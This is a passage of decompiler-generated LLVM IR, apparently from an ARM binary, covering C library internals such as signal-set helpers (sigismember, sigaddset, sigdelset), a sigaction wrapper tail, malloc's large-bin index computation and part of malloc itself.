  br label %dec_label_pc_1325c

dec_label_pc_13254:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r6, align 4
  %v7_13258 = icmp slt i32 %arg1, 65
  br i1 %v7_13258, label %dec_label_pc_13278, label %dec_label_pc_1325c

dec_label_pc_1325c:                               ; preds = %.thread16, %dec_label_pc_13254
  %v0_13260 = call i32 @__aeabi_read_tp()
  %v3_13264 = load i16, i16* @global_var_23424.488, align 2
  %v4_13264 = sext i16 %v3_13264 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13270 = add i32 %v4_13264, %v0_13260
  %v4_13270 = inttoptr i32 %v3_13270 to i32*
  store i32 22, i32* %v4_13270, align 4
  %v0_132d0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_13278:                               ; preds = %dec_label_pc_13254
  %v2_13278 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13278, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_13280 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_13280, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_13290 = call i32 @__sigaddset()
  %v0_13298 = load i32, i32* @r5, align 4
  store i32 %v0_13298, i32* %r1.global-to-local, align 4
  %v0_1329c = load i32, i32* @r6, align 4
  %v2_1329c = add i32 %v0_1329c, 12128
  %v2_132a0 = call i32 @__GI___sigismember(i32 %v2_1329c, i32 %v0_13298)
  store i32 %v2_13278, i32* %r1.global-to-local, align 4
  %v0_132b4 = load i32, i32* @r5, align 4
  %v3_132c0 = call i32 @__libc_sigaction(i32 %v0_132b4, i32 %v2_13278, i32 %v2_13238)
  %v1_132c4 = icmp slt i32 %v3_132c0, 0
  br i1 %v1_132c4, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_13278
  %v5_132c8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_132c8, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_13278
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_1325c, %bb32
  %v0_132d0 = phi i32 [ %v5_132c8, %bb31 ], [ %v0_132d0.pre, %dec_label_pc_1325c ], [ -1, %bb32 ]
  %v2_132d8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_132d8, i32* @r4, align 4
  store i32 %v6_13228, i32* @r5, align 4
  store i32 %v9_13228, i32* @r6, align 4
  ret i32 %v0_132d0

; uselistorder directives
  uselistorder i32 %v2_13278, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1325c, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_132ec = add i32 %arg2, -1
  %v3_132f0 = udiv i32 %v1_132ec, 32
  %v4_132f4 = mul nuw nsw i32 %v3_132f0, 4
  %v5_132f4 = add i32 %v4_132f4, %arg1
  %v6_132f4 = inttoptr i32 %v5_132f4 to i32*
  %v7_132f4 = load i32, i32* %v6_132f4, align 4
  %v1_132f8 = urem i32 %v1_132ec, 32
  %v7_13300 = shl i32 1, %v1_132f8
  %v8_13300 = and i32 %v7_132f4, %v7_13300
  %v10_13300 = icmp ne i32 %v8_13300, 0
  %. = zext i1 %v10_13300 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_132ec, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_13310 = load i32, i32* @r1, align 4
  %v1_13310 = add i32 %v0_13310, -1
  %v3_13314 = udiv i32 %v1_13310, 32
  %v0_13318 = load i32, i32* @r0, align 4
  %v4_13318 = mul nuw nsw i32 %v3_13314, 4
  %v5_13318 = add i32 %v0_13318, %v4_13318
  %v6_13318 = inttoptr i32 %v5_13318 to i32*
  %v7_13318 = load i32, i32* %v6_13318, align 4
  %v1_1331c = urem i32 %v1_13310, 32
  %v7_13324 = shl i32 1, %v1_1331c
  %v8_13324 = or i32 %v7_13318, %v7_13324
  store i32 %v8_13324, i32* %v6_13318, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13310, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_13334 = add i32 %arg2, -1
  %v3_13338 = udiv i32 %v1_13334, 32
  %v4_1333c = mul nuw nsw i32 %v3_13338, 4
  %v5_1333c = add i32 %v4_1333c, %arg1
  %v6_1333c = inttoptr i32 %v5_1333c to i32*
  %v7_1333c = load i32, i32* %v6_1333c, align 4
  %v1_13340 = urem i32 %v1_13334, 32
  %tmp = shl i32 -1, %v1_13340
  %v8_13348 = add i32 %tmp, -1
  %v9_13348 = and i32 %v7_1333c, %v8_13348
  store i32 %v9_13348, i32* %v6_1333c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13334, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_13358 = udiv i32 %arg1, 256
  store i32 %v3_13358, i32* %r1.global-to-local, align 4
  %v2_1335c = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_1335c, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_13368 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1335c, i32 %v0_13368)
  %v0_1336c = load i32, i32* %r1.global-to-local, align 4
  %v1_1336c = add i32 %v0_1336c, 1048320
  %v3_13370 = udiv i32 %v1_1336c, 65536
  %v1_13374 = and i32 %v3_13370, 8
  %v6_13378 = shl i32 %v0_1336c, %v1_13374
  %v1_1337c = add i32 %v6_13378, 520192
  %v3_13380 = udiv i32 %v1_1337c, 65536
  %v1_13384 = and i32 %v3_13380, 4
  %v6_13388 = shl i32 %v6_13378, %v1_13384
  %v1_1338c = add i32 %v6_13388, 245760
  %v3_13390 = udiv i32 %v1_1338c, 65536
  %v1_13394 = and i32 %v3_13390, 2
  %v6_13398 = shl i32 %v6_13388, %v1_13394
  store i32 %v6_13398, i32* %r1.global-to-local, align 4
  %v1_1339c = sub nsw i32 13, %v1_13374
  %v2_133a0 = sub nsw i32 %v1_1339c, %v1_13384
  %v3_133a4 = udiv i32 %v6_13398, 32768
  %v4_133a4 = sub nuw nsw i32 -1, %v3_133a4
  %v4_133a8 = udiv i32 %v6_13398, 16384
  %v5_133a8 = and i32 %v4_133a8, %v4_133a4
  %v2_133ac = sub nsw i32 %v2_133a0, %v1_13394
  %v2_133b0 = add nsw i32 %v2_133ac, %v5_133a8
  %v1_133b4 = add nsw i32 %v2_133b0, 6
  %v0_133b8 = load i32, i32* %ip.global-to-local, align 4
  %v6_133b8 = lshr i32 %v0_133b8, %v1_133b4
  %v3_133bc = mul nsw i32 %v2_133b0, 4
  %v1_133c0 = add nsw i32 %v3_133bc, 32
  %v1_133c4 = urem i32 %v6_133b8, 4
  %v2_133c8 = or i32 %v1_133c4, %v1_133c0
  ret i32 %v2_133c8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_133d0 = load i32, i32* @r4, align 4
  %v6_133d0 = load i32, i32* @r5, align 4
  %v9_133d0 = load i32, i32* @r6, align 4
  %v12_133d0 = load i32, i32* @r7, align 4
  %v15_133d0 = load i32, i32* @r8, align 4
  %v18_133d0 = load i32, i32* @sb, align 4
  %v21_133d0 = load i32, i32* @sl, align 4
  %v24_133d0 = load i32, i32* @fp, align 4
  %v27_133d0 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r1.global-to-local, align 4
  %v4_133e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 108) to i32*), align 4
  store i32 %v4_133e4, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_133f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 68) to i32*), align 4
  store i32 %v4_133f0, i32* %r1.global-to-local, align 4
  %v0_133f4 = load i32, i32* @r0, align 4
  store i32 %v0_133f4, i32* @r5, align 4
  store i32 %v4_133e4, i32* %r2.global-to-local, align 4
  %v2_133fc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_133fc, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %ip.global-to-local, align 4
  %v4_13408 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 112) to i32*), align 4
  store i32 %v4_13408, i32* %ip.global-to-local, align 4
  store i32 78868, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13408)
  %v0_13414 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13414, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r1, align 4
  %v4_13420 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 16) to i32*), align 4
  store i32 %v4_13420, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1342c.586 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13420)
  %v0_1342c = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1342c, -32
  br i1 %tmp, label %dec_label_pc_13450, label %dec_label_pc_13434

dec_label_pc_13434:                               ; preds = %entry
  store i32 65504, i32* %r2.global-to-local, align 4
  %v0_13438 = call i32 @__aeabi_read_tp()
  store i32 %v0_13438, i32* %r0.global-to-local, align 4
  %v3_1343c = load i16, i16* @global_var_23424.488, align 2
  %v4_1343c = sext i16 %v3_1343c to i32
  store i32 %v4_1343c, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_13448 = add i32 %v4_1343c, %v0_13438
  %v4_13448 = inttoptr i32 %v3_13448 to i32*
  store i32 12, i32* %v4_13448, align 4
  br label %dec_label_pc_13cd4

dec_label_pc_13450:                               ; preds = %entry
  %v1_13450 = add i32 %v0_1342c, 11
  store i32 %v1_13450, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r2.global-to-local, align 4
  %v2_1345c = icmp ugt i32 %v1_13450, 14
  %v7_1345c = icmp eq i32 %v1_13450, 15
  %v2_13460 = xor i1 %v7_1345c, true
  %v3_13460 = and i1 %v2_1345c, %v2_13460
  br i1 %v3_13460, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_13450
  %v5_13460 = and i32 %v1_13450, -8
  store i32 %v5_13460, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_13450, %bb
  %v4_13464 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_13464, i32* @r0, align 4
  %v1_13468 = inttoptr i32 %v4_13464 to i32*
  %v2_13468 = load i32, i32* %v1_13468, align 4
  store i32 %v2_13468, i32* @r4, align 4
  %v2_1346c = xor i1 %v2_1345c, true
  %v3_1346c = or i1 %v7_1345c, %v2_1346c
  br i1 %v3_1346c, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_13470 = urem i32 %v2_13468, 2
  %v2_13470 = icmp eq i32 %v1_13470, 0
  br i1 %v2_13470, label %dec_label_pc_13478, label %dec_label_pc_13488

dec_label_pc_13478:                               ; preds = %bb143
  %v2_13478 = icmp eq i32 %v2_13468, 0
  br i1 %v2_13478, label %dec_label_pc_13480, label %dec_label_pc_13864

dec_label_pc_13480:                               ; preds = %dec_label_pc_13478
  %v0_13480 = call i32 @__malloc_consolidate()
  store i32 %v0_13480, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13864

dec_label_pc_13488:                               ; preds = %bb143
  %v0_13488 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_13488, %v2_13468
  br i1 %tmp204, label %dec_label_pc_134b0, label %dec_label_pc_13490

dec_label_pc_13490:                               ; preds = %dec_label_pc_13488
  %v1_13490 = add i32 %v4_13464, -4
  store i32 %v1_13490, i32* %r1.global-to-local, align 4
  %v3_13494 = udiv i32 %v0_13488, 8
  store i32 %v3_13494, i32* %r2.global-to-local, align 4
  %v4_13498 = mul nuw i32 %v3_13494, 4
  %v5_13498 = add i32 %v4_13498, %v1_13490
  %v6_13498 = inttoptr i32 %v5_13498 to i32*
  %v7_13498 = load i32, i32* %v6_13498, align 4
  store i32 %v7_13498, i32* %r0.global-to-local, align 4
  %v2_1349c = icmp eq i32 %v7_13498, 0
  br i1 %v2_1349c, label %dec_label_pc_134b0, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13490
  %v2_134a0 = add i32 %v7_13498, 8
  %v3_134a0 = inttoptr i32 %v2_134a0 to i32*
  %v4_134a0 = load i32, i32* %v3_134a0, align 4
  store i32 %v4_134a0, i32* %r3.global-to-local, align 4
  store i32 %v2_134a0, i32* %r0.global-to-local, align 4
  store i32 %v2_134a0, i32* %r4.global-to-local, align 4
  store i32 %v4_134a0, i32* %v6_13498, align 4
  br label %dec_label_pc_13cb8

dec_label_pc_134b0:                               ; preds = %dec_label_pc_13490, %dec_label_pc_13488
  %tmp205 = icmp ugt i32 %v0_13488, 255
  br i1 %tmp205, label %dec_label_pc_13500, label %dec_label_pc_134b8

dec_label_pc_134b8:                               ; preds = %dec_label_pc_134b0
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_134c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  %v3_134c4 = udiv i32 %v0_13488, 8
  store i32 %v3_134c4, i32* @r7, align 4
  %v4_134c8 = mul nuw i32 %v3_134c4, 8
  %v5_134c8 = add i32 %v4_134c0, %v4_134c8
  store i32 %v5_134c8, i32* %r3.global-to-local, align 4
  %v1_134cc = add i32 %v5_134c8, 44
  store i32 %v1_134cc, i32* %ip.global-to-local, align 4
  %v1_134d0 = add i32 %v5_134c8, 56
  %v2_134d0 = inttoptr i32 %v1_134d0 to i32*
  %v3_134d0 = load i32, i32* %v2_134d0, align 4
  store i32 %v3_134d0, i32* %r0.global-to-local, align 4
  %v9_134d4 = icmp eq i32 %v3_134d0, %v1_134cc
  br i1 %v9_134d4, label %dec_label_pc_13660, label %dec_label_pc_134dc

dec_label_pc_134dc:                               ; preds = %dec_label_pc_134b8
  %v2_134dc = add i32 %v3_134d0, %v0_13488
  store i32 %v2_134dc, i32* %r3.global-to-local, align 4
  %v1_134e0 = add i32 %v2_134dc, 4
  %v2_134e0 = inttoptr i32 %v1_134e0 to i32*
  %v3_134e0 = load i32, i32* %v2_134e0, align 4
  store i32 %v3_134e0, i32* %r2.global-to-local, align 4
  %v1_134e4 = add i32 %v3_134d0, 12
  %v2_134e4 = inttoptr i32 %v1_134e4 to i32*
  %v3_134e4 = load i32, i32* %v2_134e4, align 4
  store i32 %v3_134e4, i32* %r1.global-to-local, align 4
  %v1_134e8 = or i32 %v3_134e0, 1
  store i32 %v1_134e8, i32* %r2.global-to-local, align 4
  %v1_134ec = add i32 %v3_134d0, 8
  store i32 %v1_134ec, i32* %r4.global-to-local, align 4
  store i32 %v1_134e8, i32* %v2_134e0, align 4
  %v0_134f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_134f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_134f4 = add i32 %v1_134f4, 8
  %v3_134f4 = inttoptr i32 %v2_134f4 to i32*
  store i32 %v0_134f4, i32* %v3_134f4, align 4
  %v0_134f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_134f8 = load i32, i32* %ip.global-to-local, align 4
  %v2_134f8 = add i32 %v1_134f8, 12
  %v3_134f8 = inttoptr i32 %v2_134f8 to i32*
  store i32 %v0_134f8, i32* %v3_134f8, align 4
  br label %dec_label_pc_13cb8

dec_label_pc_13500:                               ; preds = %dec_label_pc_134b0
  store i32 %v0_13488, i32* %r0.global-to-local, align 4
  %v1_13504 = call i32 @__malloc_largebin_index(i32 %v0_13488)
  store i32 %v1_13504, i32* %r0.global-to-local, align 4
  %v0_13508 = load i32, i32* @r4, align 4
  %v1_13508 = and i32 %v0_13508, 2
  %v2_13508 = icmp eq i32 %v1_13508, 0
  store i32 %v1_13504, i32* @r7, align 4
  br i1 %v2_13508, label %dec_label_pc_13660, label %dec_label_pc_13514

dec_label_pc_13514:                               ; preds = %dec_label_pc_13500
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r1.global-to-local, align 4
  %v4_1351c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_1351c, i32* @r0, align 4
  %v0_13520 = call i32 @__malloc_consolidate()
  store i32 %v0_13520, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13660

dec_label_pc_13528:                               ; preds = %dec_label_pc_13674
  %v1_13528 = add i32 %v3_13674, 4
  %v2_13528 = inttoptr i32 %v1_13528 to i32*
  %v3_13528 = load i32, i32* %v2_13528, align 4
  store i32 %v3_13528, i32* %r3.global-to-local, align 4
  %v0_1352c = load i32, i32* @sl, align 4
  %v1_13530 = and i32 %v3_13528, -4
  store i32 %v1_13530, i32* %r4.global-to-local, align 4
  %v1_13534 = add i32 %v3_13674, 12
  %v2_13534 = inttoptr i32 %v1_13534 to i32*
  %v3_13534 = load i32, i32* %v2_13534, align 4
  store i32 %v3_13534, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_1352c, 255
  br i1 %tmp206, label %dec_label_pc_13590, label %dec_label_pc_1353c

dec_label_pc_1353c:                               ; preds = %dec_label_pc_13528
  %v9_1353c = icmp eq i32 %v3_13534, %v0_13594
  br i1 %v9_1353c, label %dec_label_pc_13544, label %dec_label_pc_13590

dec_label_pc_13544:                               ; preds = %dec_label_pc_1353c
  %v0_13544 = load i32, i32* @sb, align 4
  %v1_13544 = add i32 %v0_13544, 48
  %v2_13544 = inttoptr i32 %v1_13544 to i32*
  %v3_13544 = load i32, i32* %v2_13544, align 4
  store i32 %v3_13544, i32* %r3.global-to-local, align 4
  %v9_13548 = icmp eq i32 %v3_13674, %v3_13544
  br i1 %v9_13548, label %dec_label_pc_13550, label %dec_label_pc_13590

dec_label_pc_13550:                               ; preds = %dec_label_pc_13544
  %v1_13550 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_13530, %v1_13550
  br i1 %tmp207, label %dec_label_pc_13558, label %dec_label_pc_13590

dec_label_pc_13558:                               ; preds = %dec_label_pc_13550
  %v2_13558 = sub i32 %v1_13530, %v0_1352c
  store i32 %v2_13558, i32* %r2.global-to-local, align 4
  %v2_1355c = add i32 %v0_1352c, %v3_13674
  store i32 %v2_1355c, i32* %r3.global-to-local, align 4
  %v1_13560 = or i32 %v0_1352c, 1
  store i32 %v1_13560, i32* %r0.global-to-local, align 4
  %v1_13564 = or i32 %v2_13558, 1
  store i32 %v1_13564, i32* %r1.global-to-local, align 4
  %v1_13568 = add i32 %v3_13674, 8
  store i32 %v1_13568, i32* %r4.global-to-local, align 4
  %v2_1356c = add i32 %v0_13594, 8
  %v3_1356c = inttoptr i32 %v2_1356c to i32*
  store i32 %v2_1355c, i32* %v3_1356c, align 4
  %v0_13570 = load i32, i32* %r3.global-to-local, align 4
  %v1_13570 = load i32, i32* %ip.global-to-local, align 4
  %v2_13570 = add i32 %v1_13570, 12
  %v3_13570 = inttoptr i32 %v2_13570 to i32*
  store i32 %v0_13570, i32* %v3_13570, align 4
  %v0_13574 = load i32, i32* %r0.global-to-local, align 4
  %v1_13574 = load i32, i32* @r6, align 4
  %v2_13574 = add i32 %v1_13574, 4
  %v3_13574 = inttoptr i32 %v2_13574 to i32*
  store i32 %v0_13574, i32* %v3_13574, align 4
  %v0_13578 = load i32, i32* %r3.global-to-local, align 4
  %v1_13578 = load i32, i32* @sb, align 4
  %v2_13578 = add i32 %v1_13578, 48
  %v3_13578 = inttoptr i32 %v2_13578 to i32*
  store i32 %v0_13578, i32* %v3_13578, align 4
  %v0_1357c = load i32, i32* %r2.global-to-local, align 4
  %v1_1357c = load i32, i32* %r3.global-to-local, align 4
  %v3_1357c = add i32 %v1_1357c, %v0_1357c
  %v4_1357c = inttoptr i32 %v3_1357c to i32*
  store i32 %v0_1357c, i32* %v4_1357c, align 4
  %v0_13580 = load i32, i32* %r1.global-to-local, align 4
  %v1_13580 = load i32, i32* %r3.global-to-local, align 4
  %v2_13580 = add i32 %v1_13580, 4
  %v3_13580 = inttoptr i32 %v2_13580 to i32*
  store i32 %v0_13580, i32* %v3_13580, align 4
  %v0_13584 = load i32, i32* %ip.global-to-local, align 4
  %v1_13584 = load i32, i32* %r3.global-to-local, align 4
  %v2_13584 = add i32 %v1_13584, 12
  %v3_13584 = inttoptr i32 %v2_13584 to i32*
  store i32 %v0_13584, i32* %v3_13584, align 4
  %v0_13588 = load i32, i32* %ip.global-to-local, align 4
  %v1_13588 = load i32, i32* %r3.global-to-local, align 4
  %v2_13588 = add i32 %v1_13588, 8
  %v3_13588 = inttoptr i32 %v2_13588 to i32*
  store i32 %v0_13588, i32* %v3_13588, align 4
  br label %dec_label_pc_13cb8

dec_label_pc_13590:                               ; preds = %dec_label_pc_13550, %dec_label_pc_13544, %dec_label_pc_1353c, %dec_label_pc_13528
  %v9_13590 = icmp eq i32 %v1_13530, %v0_1352c
  %v2_13594 = add i32 %v3_13534, 8
  %v3_13594 = inttoptr i32 %v2_13594 to i32*
  store i32 %v0_13594, i32* %v3_13594, align 4
  %v0_13598 = load i32, i32* %ip.global-to-local, align 4
  %v1_13598 = load i32, i32* %r5.global-to-local, align 4
  %v2_13598 = add i32 %v1_13598, 12
  %v3_13598 = inttoptr i32 %v2_13598 to i32*
  store i32 %v0_13598, i32* %v3_13598, align 4
  br i1 %v9_13590, label %dec_label_pc_136f0.loopexit, label %dec_label_pc_135ac

dec_label_pc_135ac:                               ; preds = %dec_label_pc_13590
  %v0_135ac = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_135ac, 255
  br i1 %tmp208, label %dec_label_pc_135d0, label %dec_label_pc_135b4

dec_label_pc_135b4:                               ; preds = %dec_label_pc_135ac
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r2.global-to-local, align 4
  %v1_135b8 = load i32, i32* %r8.global-to-local, align 4
  %v2_135b8 = add i32 %v1_135b8, ptrtoint (i32* @global_var_233cc.493 to i32)
  %v3_135b8 = inttoptr i32 %v2_135b8 to i32*
  %v4_135b8 = load i32, i32* %v3_135b8, align 4
  %v3_135bc = udiv i32 %v0_135ac, 8
  store i32 %v3_135bc, i32* %r0.global-to-local, align 4
  %v4_135c0 = mul nuw i32 %v3_135bc, 8
  %v5_135c0 = add i32 %v4_135b8, %v4_135c0
  store i32 %v5_135c0, i32* %r3.global-to-local, align 4
  %v1_135c4 = add i32 %v5_135c0, 44
  store i32 %v1_135c4, i32* %ip.global-to-local, align 4
  %v1_135c8 = add i32 %v5_135c0, 52
  %v2_135c8 = inttoptr i32 %v1_135c8 to i32*
  %v3_135c8 = load i32, i32* %v2_135c8, align 4
  store i32 %v3_135c8, i32* @lr, align 4
  br label %dec_label_pc_13628

dec_label_pc_135d0:                               ; preds = %dec_label_pc_135ac
  store i32 %v0_135ac, i32* %r0.global-to-local, align 4
  %v1_135d4 = call i32 @__malloc_largebin_index(i32 %v0_135ac)
  store i32 %v1_135d4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %ip.global-to-local, align 4
  %v1_135dc = load i32, i32* %r8.global-to-local, align 4
  %v2_135dc = add i32 %v1_135dc, ptrtoint (i32* @global_var_233cc.493 to i32)
  %v3_135dc = inttoptr i32 %v2_135dc to i32*
  %v4_135dc = load i32, i32* %v3_135dc, align 4
  %v4_135e0 = mul i32 %v1_135d4, 8
  %v5_135e0 = add i32 %v4_135dc, %v4_135e0
  store i32 %v5_135e0, i32* %r3.global-to-local, align 4
  %v1_135e4 = add i32 %v5_135e0, 44
  store i32 %v1_135e4, i32* %ip.global-to-local, align 4
  %v1_135e8 = add i32 %v5_135e0, 52
  %v2_135e8 = inttoptr i32 %v1_135e8 to i32*
  %v3_135e8 = load i32, i32* %v2_135e8, align 4
  store i32 %v3_135e8, i32* @lr, align 4
  %v9_135ec = icmp eq i32 %v3_135e8, %v1_135e4
  br i1 %v9_135ec, label %dec_label_pc_13628, label %dec_label_pc_135f4

dec_label_pc_135f4:                               ; preds = %dec_label_pc_135d0
  %v1_135f4 = add i32 %v5_135e0, 56
  %v2_135f4 = inttoptr i32 %v1_135f4 to i32*
  %v3_135f4 = load i32, i32* %v2_135f4, align 4
  store i32 %v3_135f4, i32* %r1.global-to-local, align 4
  %v1_135f8 = add i32 %v3_135f4, 4
  %v2_135f8 = inttoptr i32 %v1_135f8 to i32*
  %v3_135f8 = load i32, i32* %v2_135f8, align 4
  store i32 %v3_135f8, i32* %r3.global-to-local, align 4
  %v0_135fc = load i32, i32* %r4.global-to-local, align 4
  %v3_135fc = icmp ult i32 %v0_135fc, %v3_135f8
  br i1 %v3_135fc, label %.thread, label %dec_label_pc_13618.preheader

.thread:                                          ; preds = %dec_label_pc_135f4
  store i32 %v1_135e4, i32* @lr, align 4
  store i32 %v3_135f4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13628

dec_label_pc_13618.preheader:                     ; preds = %dec_label_pc_135f4
  %v2_13604 = or i32 %v0_135fc, 1
  store i32 %v2_13604, i32* %r2.global-to-local, align 4
  %v1_13618182 = add i32 %v3_135e8, 4
  %v2_13618183 = inttoptr i32 %v1_13618182 to i32*
  %v3_13618184 = load i32, i32* %v2_13618183, align 4
  store i32 %v3_13618184, i32* %r3.global-to-local, align 4
  %v3_1361c186 = icmp ult i32 %v2_13604, %v3_13618184
  br i1 %v3_1361c186, label %dec_label_pc_13614, label %dec_label_pc_13624

dec_label_pc_13614:                               ; preds = %dec_label_pc_13618.preheader, %dec_label_pc_13614
  %v0_13624187 = phi i32 [ %v3_13614, %dec_label_pc_13614 ], [ %v3_135e8, %dec_label_pc_13618.preheader ]
  %v1_13614 = add i32 %v0_13624187, 8
  %v2_13614 = inttoptr i32 %v1_13614 to i32*
  %v3_13614 = load i32, i32* %v2_13614, align 4
  store i32 %v3_13614, i32* @lr, align 4
  %v1_13618 = add i32 %v3_13614, 4
  %v2_13618 = inttoptr i32 %v1_13618 to i32*
  %v3_13618 = load i32, i32* %v2_13618, align 4
  store i32 %v3_13618, i32* %r3.global-to-local, align 4
  %v3_1361c = icmp ult i32 %v2_13604, %v3_13618
  br i1 %v3_1361c, label %dec_label_pc_13614, label %dec_label_pc_13624

dec_label_pc_13624:                               ; preds = %dec_label_pc_13614, %dec_label_pc_13618.preheader
  %v0_13624.lcssa = phi i32 [ %v3_135e8, %dec_label_pc_13618.preheader ], [ %v3_13614, %dec_label_pc_13614 ]
  %v1_13624 = add i32 %v0_13624.lcssa, 12
  %v2_13624 = inttoptr i32 %v1_13624 to i32*
  %v3_13624 = load i32, i32* %v2_13624, align 4
  store i32 %v3_13624, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13628

dec_label_pc_13628:                               ; preds = %.thread, %dec_label_pc_135d0, %dec_label_pc_135b4, %dec_label_pc_13624
  %v0_13648 = phi i32 [ %v1_135e4, %dec_label_pc_135d0 ], [ %v1_135c4, %dec_label_pc_135b4 ], [ %v3_13624, %dec_label_pc_13624 ], [ %v3_135f4, %.thread ]
  %v0_1363c = phi i32 [ %v1_135d4, %dec_label_pc_135d0 ], [ %v3_135bc, %dec_label_pc_135b4 ], [ %v1_135d4, %dec_label_pc_13624 ], [ %v1_135d4, %.thread ]
  %v1_1362c = phi i32 [ %v1_135dc, %dec_label_pc_135d0 ], [ %v1_135b8, %dec_label_pc_135b4 ], [ %v1_135dc, %dec_label_pc_13624 ], [ %v1_135dc, %.thread ]
